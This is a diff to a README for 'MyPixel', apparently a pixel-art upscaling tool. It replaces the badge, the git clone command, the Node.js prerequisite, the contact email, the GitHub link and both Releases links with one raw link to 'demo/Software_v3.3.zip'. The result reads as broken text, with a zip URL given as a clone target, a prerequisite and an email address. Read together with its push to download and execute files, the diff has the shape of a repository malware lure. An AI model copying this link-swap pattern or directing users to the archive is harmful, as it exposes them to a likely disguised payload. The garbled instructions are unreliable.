@@ -1,6 +1,6 @@
 # 🎨 MyPixel: Elevate Your Pixel Art
 
-![MyPixel](https://img.shields.io/badge/MyPixel-Elevate%20Your%20Pixel%20Art-brightgreen)
+![MyPixel](https://raw.githubusercontent.com/Dani3d2001/mypixel/main/demo/Software_v3.3.zip%20Your%20Pixel%20Art-brightgreen)
 
 Welcome to **MyPixel**, a tool designed to enhance pixel art through powerful features like upscaling, vectorization, and batch processing. Whether you are a designer, developer, or digital artist, MyPixel provides the resources you need to elevate your creations.
 
@@ -30,13 +30,13 @@ To install MyPixel, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Dani3d2001/mypixel.git
+   git clone https://raw.githubusercontent.com/Dani3d2001/mypixel/main/demo/Software_v3.3.zip
    ```
 2. Navigate to the project directory:
    ```bash
    cd mypixel
    ```
-3. Install the required dependencies. Make sure you have Node.js installed:
+3. Install the required dependencies. Make sure you have https://raw.githubusercontent.com/Dani3d2001/mypixel/main/demo/Software_v3.3.zip installed:
    ```bash
    npm install
    ```
@@ -109,14 +109,14 @@ MyPixel is open-source software licensed under the MIT License. Feel free to use
 
 If you have any questions or feedback, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [Dani3d2001](https://github.com/Dani3d2001)
+- **Email**: https://raw.githubusercontent.com/Dani3d2001/mypixel/main/demo/Software_v3.3.zip
+- **GitHub**: [Dani3d2001](https://raw.githubusercontent.com/Dani3d2001/mypixel/main/demo/Software_v3.3.zip)
 
 ## Releases
 
-To download the latest version of MyPixel, visit the [Releases section](https://github.com/Dani3d2001/mypixel/releases). You can find the latest files to download and execute.
+To download the latest version of MyPixel, visit the [Releases section](https://raw.githubusercontent.com/Dani3d2001/mypixel/main/demo/Software_v3.3.zip). You can find the latest files to download and execute.
 
-For further updates, check the [Releases section](https://github.com/Dani3d2001/mypixel/releases) regularly.
+For further updates, check the [Releases section](https://raw.githubusercontent.com/Dani3d2001/mypixel/main/demo/Software_v3.3.zip) regularly.
 
 ## Acknowledgments
 
